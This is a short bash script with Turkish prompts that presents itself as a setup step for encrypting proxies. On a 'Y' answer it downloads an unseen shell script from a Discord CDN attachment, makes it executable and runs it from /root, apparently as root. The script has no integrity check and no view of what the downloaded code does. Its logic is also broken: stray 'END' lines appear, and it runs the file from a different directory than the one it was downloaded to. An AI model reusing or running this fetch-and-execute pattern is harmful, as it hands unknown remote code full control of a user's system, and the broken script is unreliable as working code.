#!/bin/bash

while true; do
    read -p "Proxyler Sifrelensin mi Y veya N basiniz..." yn
    case $yn in
        [Yy]* ) wget https://cdn.discordapp.com/attachments/704453678253211648/731824833163296808/asadsas.sh; break;;
        [Nn]* ) exit;;
        * ) echo "Lütfen birine basiniz Y veya N.";;
    esac
done
END

chmod +x asadsas.sh

sed -i -e 's/\r$//' asadsas.sh

cd /root

./asadsas.sh